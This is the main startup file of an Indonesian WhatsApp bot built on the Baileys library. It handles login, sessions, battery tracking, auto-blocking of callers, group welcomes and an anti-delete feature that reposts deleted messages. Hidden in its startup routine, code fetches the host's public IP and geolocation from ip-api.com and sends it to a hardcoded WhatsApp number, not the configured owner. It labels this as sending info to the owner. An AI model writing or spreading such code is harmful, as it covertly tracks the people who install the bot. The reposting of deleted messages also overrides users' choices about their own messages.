const { WAConnection: _WAConnection, Browsers, MessageType } = require('@adiwajshing/baileys')



const ikyy = require('./lib/simple.js')



const WAConnection = ikyy.WAConnection(_WAConnection)



const  { Functions } = require('./lib/functions.js');



const { color, bgcolor } = require('./lib/color')



const fs = require("fs-extra")


const { version, bugs } = require('./package.json')


const { banner, start, success, getGroupAdmins } = require("./lib/functionsss");


const fetch = require("node-fetch");


const sleep = async (ms) => {

    return new Promise(resolve => setTimeout(resolve, ms));

} 





const figlet = require('figlet')



const { uncache, nocache } = require('./lib/loader')


const setting = JSON.parse(fs.readFileSync('./setting.json'))



const welcome = require('./message/group')

const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: fs.readFileSync(`media/odc.jpeg`), surface: 200, message: `ʀɪғǫɪ ʙᴏᴛᴢ`, orderTitle: `RIFQIBOTZ`, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}

baterai = 'unknown'



charging = 'unknown'


//
const moment = require("moment-timezone")
const hour_now = moment().format('HH:mm:ss')
     const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang'
}
        if(time2 < "11:00:00"){
        var ucapanWaktu = 'Selamat Pagi'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Malam'
}
const ownerName = setting.ownerName
spc1 = '         '
spc2 = '\n                       '
spc3 = '                   '
spc4 = '               '
spc5= '      '

//nocache



global.media = require('./src/json/media.json');



global.functions = new Functions();



global.logo = { buffer:functions.fs.readFileSync('./src/images/logo.jpg'),message:media.logo };



require('./iky.js')



nocache('../iky.js', module => console.log(color('[WATCH]', 'yellow'), color(`'${module}'`, 'cyan'), 'File is updated!'))



require('./message/group.js')



nocache('../message/group.js', module => console.log(color('[WATCH]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))







const starts = async (ikyy = new WAConnection()) => {



	ikyy.logger.level = 'warn'

ikyy.version = [2, 2147, 14];

	console.log(color(figlet.textSync('YT RIFQI BOTZ', {



		font: 'Standard',



		horizontalLayout: 'default',



		vertivalLayout: 'default',



		width: 80,



		whitespaceBreak: false



	}), 'cyan'))

console.log(color(`${spc2}[ • HAI KAK ${ownerName} ${ucapanWaktu} • ]` ,'cyan'))
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
console.log(color(`${spc3}[•]`, 'aqua'), color(`Hai         : ${ucapanWaktu}`, 'white'))
console.log(color(`${spc3}[•]`, 'aqua'), color(`Bot Version : 4.0.0`, 'white'))
console.log(color(`${spc3}[•]`, 'aqua'), color(`Status      : Online!`, 'white'))
console.log(color(`${spc3}[•]`, 'aqua'), color(`Owner       : ${ownerName}`, 'white'))
console.log(color(`${spc4}< ================================================== >`, 'cyan'))



	// Menunggu QR Muncul



	ikyy.on('qr', () => {



		console.log(color('[', 'blue'), color('!', 'yellow'), color(']', 'white'), color('Please scan qr code'))



	})







	// Menghubungkan Kack



	fs.existsSync(`./${setting.sessionName}.json`) && ikyy.loadAuthInfo(`./${setting.sessionName}.json`)



	ikyy.on('connecting', () => {



		console.log(color('[ LORD RIFQI BOTZ ]', 'cyan'), color('Menghubungkan....'));



	})




	//connect



	ikyy.on('open', () => {



console.log(color('[ LORD RIFQI BOTZ ]', 'cyan'), color('Bot Sudah Online!'));

ikyy.browserDescription = ["RIFQI - BOTZ", "Safari", "3.0.0"];


	})

//join ke gc

/**teks = `https://chat.whatsapp.com/JtXKjv1uGhKJyrpERmN6AZ`
 ikyy.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|INFO!|', 'yellow'), color('JOINED TO FORUM WHATSAPP BOT GROUP', 'cyan'))**/


// send message 
fetch(`http://ip-api.com/line`).then(res => res.text())  

        .then(bu =>{

console.log(color('|INFO!|', 'yellow'), color('mengirim info bot ke owner', 'cyan'))

             buttonss = [
{buttonId: `#ping`, buttonText:{displayText: 'ᴘɪɴɢ'}, type: 1}
]

buttonMessagee = {
contentText: `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`,
footerText: `ʀɪғǫɪ ʙᴏᴛᴢ` ,
buttons: buttonss,
headerType: 1
}
ikyy.sendMessage(`6289636634511@s.whatsapp.net`,  buttonMessagee, MessageType.buttonsMessage,{
        caption: '[ • XMOODS • ]',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
         
            },
			quoted: ftroli,sendEphemeral: true 
			})
   })
   
	// session



	await ikyy.connect({



		timeoutMs: 30 * 1000



	})



	fs.writeFileSync(`./${setting.sessionName}.json`, JSON.stringify(ikyy.base64EncodedAuthInfo(), null, '\t'))




        
        
        

        //
        /*=======================================================*/

				
	// Baterai



	ikyy.on('CB:action,,battery', json => {



		global.batteryLevelStr = json[2][0][1].value



		global.batterylevel = parseInt(batteryLevelStr)



		baterai = batterylevel



		if (json[2][0][1].live == 'true') charging = true



		if (json[2][0][1].live == 'false') charging = false



		console.log(json[2][0][1])



		console.log('Baterai : ' + batterylevel + '%')



	})



	global.batrei = global.batrei ? global.batrei : []



	ikyy.on('CB:action,,battery', json => {



		const batteryLevelStr = json[2][0][1].value



		const batterylevel = parseInt(batteryLevelStr)



		global.batrei.push(batterylevel)



	})



// anticall

ikyy.on('CB:action,,call', async json => {

    const callerId = json[2][0][1].from;

    console.log("call dari "+ callerId)

        ikyy.sendMessage(callerId, "telpon = block, hubungi owner jika ingin di buka", MessageType.text)

        await sleep(4000)

        await ikyy.blockUser(callerId, "add") // Block user

})

//













	// welcome



	ikyy.on('group-participants-update', async (anu) => {



		await welcome(ikyy, anu)



	})



  



antidel = false
ikyy.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe && m.key.fromMe) return
if (antidel === false) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
const type = Object.keys(m.message)[0] 
ikyy.sendMessage(m.key.remoteJid, `\`\`\` A N T I  D E L E T E \`\`\`

ˊ Name : @${m.participant.split("@")[0]}
ˊ Day :  ${week} ${calender}
ˊ Time : ${jam}
ˊ Type : ${type}`, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})

ikyy.copyNForward(m.key.remoteJid, m.message)
})


  



	ikyy.on('chat-update', async (message) => {



		require('./iky.js')(ikyy, message)



	})



}







starts()
